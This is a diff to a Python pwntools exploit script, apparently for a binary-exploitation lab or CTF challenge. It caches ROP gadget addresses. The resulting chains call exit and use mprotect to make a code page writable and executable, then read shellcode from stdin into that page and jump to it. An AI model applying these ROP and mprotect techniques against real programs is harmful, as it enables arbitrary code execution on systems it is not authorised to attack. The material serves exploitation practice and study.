@@ -19,6 +19,13 @@ code_bytes = b''
 start_code_address = None
 timestamp = None
 
+# address
+pop_rax_ret = None
+pop_rdi_ret = None
+syscall_ret = None
+pop_rsi_ret = None
+pop_rdx_ret = None
+
 def get_init_info():
     global start_code_address, timestamp
 
@@ -75,22 +82,32 @@ def code_bytes_find(target_asm):
         pass
     return pos
 
+def get_rop_addr():
+    global pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret
+
+    pop_rax_ret = code_bytes_find(asm("pop rax\nret")) + start_code_address
+    pop_rdi_ret = code_bytes_find(asm("pop rdi\nret")) + start_code_address
+    syscall_ret = code_bytes_find(asm("syscall\nret")) + start_code_address
+    pop_rsi_ret = code_bytes_find(asm("pop rsi\nret")) + start_code_address
+    pop_rdx_ret = code_bytes_find(asm("pop rdx\nret")) + start_code_address
+
+
 def task1_byte():
-    global start_code_address
+    global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret
 
     send_line = flat(
-        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        pop_rax_ret,
         60,
-        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        pop_rdi_ret,
         37,
-        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        syscall_ret,
         endianness = 'little'
     )
 
     return send_line
 
 def mprotect_byte():
-    global start_code_address
+    global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret
     mprotect_address = start_code_address & ~(0xfff)  # use the align address
     print("start_code_address: ", hex(start_code_address))
     print("mprotect_address: ", hex(mprotect_address))
@@ -102,60 +119,60 @@ def mprotect_byte():
     send_line = flat(
         # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
         # rax to place syscall number
-        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        pop_rax_ret,
         10,
         # rdi - page start
-        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        pop_rdi_ret,
         mprotect_address,
         # rsi - page len
-        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        pop_rsi_ret,
         40960,
         # rdx - dl is LSB 8 bits, open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
-        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        pop_rdx_ret,
         7,
-        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        syscall_ret,
 
         # write syscall
-        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        pop_rax_ret,
         1,
         # fd (stdout)
-        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        pop_rdi_ret,
         1,
         # buf addr
-        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        pop_rsi_ret,
         start_code_address,
         # len
-        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        pop_rdx_ret,
         50,
-        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        syscall_ret,
 
         # read user input
         # read syscall
-        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        pop_rax_ret,
         0,
         # fd (stdin)
-        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        pop_rdi_ret,
         0,
         # buf addr
-        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        pop_rsi_ret,
         start_code_address,
         # len
-        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        pop_rdx_ret,
         4096,
-        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        syscall_ret,
         # write syscall
-        code_bytes_find(asm("pop rax\nret")) + start_code_address,
+        pop_rax_ret,
         1,
         # fd (stdout)
-        code_bytes_find(asm("pop rdi\nret")) + start_code_address,
+        pop_rdi_ret,
         1,
         # buf addr
-        code_bytes_find(asm("pop rsi\nret")) + start_code_address,
+        pop_rsi_ret,
         start_code_address,
         # len
-        code_bytes_find(asm("pop rdx\nret")) + start_code_address,
+        pop_rdx_ret,
         50,
-        code_bytes_find(asm("syscall\nret")) + start_code_address,
+        syscall_ret,
         # go to execute the code here
         start_code_address,
     )
@@ -187,6 +204,8 @@ if __name__ == '__main__':
         exit(0)
 
     gen_random_code_bytes()
+    get_rop_addr()
+
     send_line = task1_byte()
     # [first send]
     send_line = mprotect_byte()
